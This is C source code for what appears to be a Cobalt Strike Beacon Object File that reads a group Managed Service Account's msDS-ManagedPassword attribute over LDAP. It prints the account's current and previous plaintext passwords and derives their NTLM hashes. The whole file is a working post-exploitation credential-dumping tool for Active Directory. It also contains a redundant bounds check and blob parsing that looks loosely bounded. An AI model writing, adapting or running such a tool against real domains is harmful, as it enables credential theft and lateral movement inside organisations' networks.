/*
 * bof-groupmanagedpw <account>
 *
 * Read a group Managed Service Account's msDS-ManagedPassword constructed
 * attribute over LDAP and derive its NT hash.  The blob is the
 * MSDS_MANAGEDPASSWORD_BLOB layout; the current password is a UTF-16 string
 * and its MD4 digest is the account's NTLM hash.
 *
 * The caller needs the "Read msDS-ManagedPassword" right on the gMSA (by
 * default members of the gMSA's principals or Domain Admins).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"
#include "ldaphelpers.h"
#include "adsd.h"

static unsigned long long blob_qword(const unsigned char *p)
{
    return (unsigned long long)p[0] | ((unsigned long long)p[1] << 8) |
           ((unsigned long long)p[2] << 16) | ((unsigned long long)p[3] << 24) |
           ((unsigned long long)p[4] << 32) | ((unsigned long long)p[5] << 40) |
           ((unsigned long long)p[6] << 48) | ((unsigned long long)p[7] << 56);
}

void go(char *args, int alen)
{
    datap parser;
    char *account;
    int alen2 = 0;
    char base[512], dn[768];
    LDAP *ld;
    ULONG rc;
    unsigned char *blob = NULL;
    unsigned int bloblen = 0;
    unsigned long long cur, prev, qint, uintv;
    unsigned int plen, chars, i;
    unsigned char nt[16];
    char hash[33], pw[512];

    BeaconDataParse(&parser, args, alen);
    account = BeaconDataExtract(&parser, &alen2);
    if (!account || !account[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: groupmanagedpw <account>\n");
        return;
    }

    ld = bof_ldap_open_ex(&rc);
    if (!ld) {
        bof_error_ldap("ldap_init/bind", rc,
                       "cannot reach or authenticate to a domain controller");
        return;
    }
    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
        bof_error_ldap("rootDSE defaultNamingContext", rc,
                       "cannot read the domain naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }
    if (bof_ldap_resolve_dn(ld, base, account, dn, sizeof(dn)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "account not found: %s\n", account);
        WLDAP32$ldap_unbind(ld);
        return;
    }
    if (bof_ldap_read_bin(ld, dn, "msDS-ManagedPassword",
                          &blob, &bloblen) != 0 || !blob) {
        BeaconPrintf(CALLBACK_ERROR,
                     "msDS-ManagedPassword unavailable (right? gMSA?)\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (bloblen < 40) {
        BeaconPrintf(CALLBACK_ERROR, "managed password blob too small (%u)\n",
                     bloblen);
        KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    cur  = blob_qword(blob + 8);
    prev = blob_qword(blob + 16);
    qint = blob_qword(blob + 24);
    uintv = blob_qword(blob + 32);

    BeaconPrintf(CALLBACK_OUTPUT, "================ gMSA password ================\n");
    BeaconPrintf(CALLBACK_OUTPUT, "account : %s\n", dn);
    BeaconPrintf(CALLBACK_OUTPUT, "blob    : %u bytes\n", bloblen);
    BeaconPrintf(CALLBACK_OUTPUT, "interval: query=%llu unchanged=%llu\n",
                 qint, uintv);

    if (cur < bloblen && cur < bloblen) {
        unsigned int avail = bloblen - (unsigned int)cur;
        unsigned int maxb = avail > 256 ? 256 : avail;
        chars = maxb / 2;
        /* Stop at the UTF-16 NUL terminator, exclude it from the hash. */
        for (i = 0; i < chars; i++) {
            if (blob[cur + i * 2] == 0 && blob[cur + i * 2 + 1] == 0)
                break;
        }
        plen = i * 2;
        bof_w2a((const wchar_t *)(blob + cur), pw, sizeof(pw));
        bof_md4(blob + cur, plen, nt);
        bof_hex16(nt, hash);
        BeaconPrintf(CALLBACK_OUTPUT, "current : %s\n", pw);
        BeaconPrintf(CALLBACK_OUTPUT, "ntlm    : %s\n", hash);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "bad current-password offset %llu\n", cur);
    }

    if (prev && prev < bloblen) {
        unsigned int avail = bloblen - (unsigned int)prev;
        unsigned int maxb = avail > 256 ? 256 : avail;
        chars = maxb / 2;
        for (i = 0; i < chars; i++) {
            if (blob[prev + i * 2] == 0 && blob[prev + i * 2 + 1] == 0)
                break;
        }
        plen = i * 2;
        bof_w2a((const wchar_t *)(blob + prev), pw, sizeof(pw));
        bof_md4(blob + prev, plen, nt);
        bof_hex16(nt, hash);
        BeaconPrintf(CALLBACK_OUTPUT, "previous: %s\n", pw);
        BeaconPrintf(CALLBACK_OUTPUT, "ntlm    : %s\n", hash);
    }

    bof_memzero(blob, bloblen);
    KERNEL32$VirtualFree(blob, 0, MEM_RELEASE);
    WLDAP32$ldap_unbind(ld);
}
